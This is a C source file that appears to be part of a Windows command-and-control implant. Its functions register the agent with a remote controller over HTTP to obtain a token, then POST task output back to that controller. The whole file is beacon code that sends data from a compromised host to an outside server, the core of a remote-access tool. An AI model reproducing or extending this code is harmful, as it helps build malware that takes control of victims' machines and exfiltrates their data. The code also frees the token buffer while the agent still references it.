#include <stdbool.h>

#include <Windows.h>
#include <lmcons.h>

#include <http_client.h>
#include <types.h>

#include <config.h>

int authenticate() {
  int success = 1;  

  char* agentToken = malloc(50);
  DWORD httpBytesRead;

  struct TLVBuild connectMessage;
  connectMessage.buf = malloc(10);
  connectMessage.allocsize = 10;
  connectMessage.bufsize = 0;

  addInt32(&connectMessage, -1);
  addString(&connectMessage, "connect");
  addString(&connectMessage, "");
  addString(&connectMessage, "");

  if (!httpGet(host, port, "/r", 40, &httpBytesRead, agentToken)) {
    success = 0;
    goto _authenticateCleanup;
  };
  agentToken[httpBytesRead] = 0x00;
  
  agent.token = agentToken;
  agent.report_uri = malloc(strlen(agentToken) + 10);
  
  printf("got token: %s\n", agentToken);
  
  strcpy(agent.report_uri, "/t?token=");
  strcat(agent.report_uri, agentToken);
  
  if (!httpPost(host, port, agent.report_uri, connectMessage.buf, connectMessage.bufsize)) {
    success = 0;
    goto _authenticateCleanup;
  }

_authenticateCleanup:
  free(connectMessage.buf);
  free(agentToken);
  return success;
}

void sendData(int taskId, char* typ, char* error, int size, char * buff) {
  struct TLVBuild outputMessage;
  outputMessage.buf = malloc(50);
  outputMessage.allocsize = 50;
  outputMessage.bufsize = 0;

  addInt32(&outputMessage, taskId);
  addString(&outputMessage, typ);
  addString(&outputMessage, error);
  addBytes(&outputMessage, true, size, buff);
  
  DWORD bytesRead;
  printf("[+] Sending %lu bytes: %.*s\n", outputMessage.bufsize, outputMessage.bufsize, outputMessage.buf);

  httpPost(
    host, port, agent.report_uri, outputMessage.buf, outputMessage.bufsize
  );
}

void sendOutput(int taskId, struct TLVBuild tlv) {
  sendData(
    taskId, "output", "", tlv.bufsize, tlv.buf
  );
}